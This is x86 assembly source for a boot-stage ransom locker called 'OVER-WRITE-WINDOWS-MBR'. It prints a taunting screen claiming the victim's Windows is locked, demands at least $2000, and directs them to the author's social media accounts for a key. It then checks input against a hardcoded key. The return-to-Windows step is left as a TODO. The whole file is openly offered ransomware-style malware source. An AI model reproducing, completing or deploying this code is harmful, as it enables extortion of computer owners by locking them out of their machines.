; *
; * OVER-WRITE-WINDOWS-MBR
; * @copyright      Copyright (c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
; * @author         justalghamdi
; *

bits 16
org 0x7e00

jmp start

start:
	mov si, start_of_header
	call puts
	mov si, header_text
	call puts
	mov si, end_of_header
	call puts
	mov si, content
	call puts

Loop:
	mov si,label_for_input
	call puts
	mov si, user_input
	call get_user_input
	mov bx, new_line
	call puts


	mov si, user_input
	mov bx,  key

	call strcmp

	cmp ax, 1
	je error
	jne windows
	error:
		mov si, error_key
		call puts
		jmp Loop 


windows:
	;; TODO jmp to windows OS



%include "shared/io.asm"
%include "shared/lib.asm"


start_of_header: db "$=====@====A====L====G====H====A====M====D====I====@====$",0xD,0xA,0
header_text: db "          Oooops! L0L You Fell in devil trap  ",0xD,0xA,0x0
end_of_header: db "$=====@====A====L====G====H====A====M====D====I====@====$",0xD,0xA,0
content: db "   ! Y0UR WIND0WS N0W IS L0CK AND Y0U CAN'T B00T TO IT ! >=)",0xD,0xA,"   G0 And G3t Y0ur D3crypt K3y Fr@m H3re: ",0xD,0xA,0xD,0xA,"     1- https://www.instagram.com/justalghamdi/",0xD,0xA,"     2- https://www.github.com/justalghamdi/",0xD,0xA,0xD,0xA,"   Mak3 Sur3 Y0u Hav3 At l3ast $2000 T0 G3t Y0ur P3rs0nal C0mput3r Back!",0xD,0xA,0xD,0xA,0x0
label_for_input: db "   Key: ",0x0
error_key: db "  <== NOT VAILD KEY !",0xA,0xD,0x0
key: db "devil-is-the-best",0x0
user_input: times 50 db 0x0 ; 
new_line: db 0xD,0xA,0x0
disknum: db 0x99


times 2048-($-$$) db 0